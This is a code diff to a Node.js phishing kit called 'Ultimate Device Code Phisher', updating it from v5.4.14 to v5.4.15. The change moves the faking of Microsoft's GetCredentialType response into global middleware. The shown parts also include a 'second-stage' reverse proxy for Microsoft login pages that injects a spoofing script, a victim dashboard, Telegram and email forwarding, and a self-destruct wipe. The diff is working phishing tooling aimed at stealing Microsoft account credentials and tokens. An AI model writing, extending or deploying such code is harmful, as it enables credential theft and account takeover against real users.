@@ -1,7 +1,7 @@
 // ============================================================
-// 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.14 – Final Mock Route
+// 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.15 – Global Intercept
 // ============================================================
-// Explicit route for GetCredentialType, placed before wildcard proxy.
+// Global middleware intercepts GetCredentialType before any route.
 // ============================================================
 
 const http = require('http');
@@ -459,6 +459,23 @@ app.use((req, res, next) => {
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
+// 🔥 GLOBAL INTERCEPTOR FOR GetCredentialType – MUST BE AFTER BODY PARSERS
+app.use((req, res, next) => {
+    if (req.url.includes('GetCredentialType')) {
+        console.log('[PHANTOM] ✅ Intercepted GetCredentialType at middleware level');
+        res.setHeader('Content-Type', 'application/json');
+        res.setHeader('Access-Control-Allow-Origin', '*');
+        res.status(200).json({
+            "Credentials": {
+                "AuthMethod": "Password",
+                "FederationRedirectUrl": null
+            }
+        });
+        return;
+    }
+    next();
+});
+
 const staticOpts = { index: false };
 app.use(express.static('public', staticOpts));
 
@@ -660,21 +677,6 @@ app.post('/device/fingerprint', (req, res) => {
     });
 });
 
-// ── 🔥 EXPLICIT ROUTE TO MOCK GetCredentialType (Must come BEFORE the wildcard proxy) ──
-app.post('/login/common/GetCredentialType', (req, res) => {
-    console.log('[PHANTOM] ✅ Explicitly intercepted GetCredentialType, returning mock 200.');
-    const fakeResponse = {
-        "Credentials": {
-            "AuthMethod": "Password",
-            "FederationRedirectUrl": null
-        }
-    };
-    res.setHeader('Access-Control-Allow-Origin', '*');
-    res.setHeader('Access-Control-Allow-Headers', '*');
-    res.setHeader('Content-Type', 'application/json');
-    return res.status(200).json(fakeResponse);
-});
-
 // ── SECOND-STAGE PHISHING: CRASH‑PROOF REVERSE PROXY ──
 app.all('/login*', async (req, res) => {
     // 🔥 Handle OPTIONS preflight requests locally to avoid 500 from Microsoft
@@ -775,7 +777,6 @@ app.all('/login*', async (req, res) => {
                 const $ = cheerio.load(html);
                 
                 // 🔥 SPOOFING SCRIPT: Intercepts GetCredentialType and fakes a success
-                // (We keep it as a fallback, but the backend already handles it)
                 const captureScript = `
                     <script>
                         (function() {
@@ -1129,7 +1130,7 @@ server.on('upgrade', (req, socket, head) => {
     if (req.url === '/ws') { wsServer.handleUpgrade(req, socket, head, (ws) => { wsServer.emit('connection', ws, req); }); } else { socket.destroy(); }
 });
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ Ultimate Device Phisher v5.4.14 – Final Mock Route running on port ${PORT}`);
+    console.log(`✅ Ultimate Device Phisher v5.4.15 – Global Intercept running on port ${PORT}`);
     console.log(`📱 Device page: http://localhost:${PORT}/device`);
     console.log(`📊 Dashboard: http://localhost:${PORT}/dash`);
     console.log(`🔧 Telegram: ${BOT_TOKEN ? 'ACTIVE' : 'DISABLED'}`);
@@ -1137,7 +1138,7 @@ server.listen(PORT, '0.0.0.0', () => {
     console.log(`📁 Campaigns: active`);
     console.log(`📧 Forward Email: ${FORWARD_EMAIL || 'DISABLED'}`);
     console.log(`💣 Self-Destruct: ${AUTO_WIPE_HOURS > 0 ? `after ${AUTO_WIPE_HOURS} hrs inactive` : 'DISABLED'}`);
-    console.log(`🚀 GetCredentialType explicitly mocked at backend: ACTIVE`);
+    console.log(`🚀 Global GetCredentialType intercept: ACTIVE`);
 });
 
 process.on('SIGTERM', () => server.close(() => process.exit(0)));
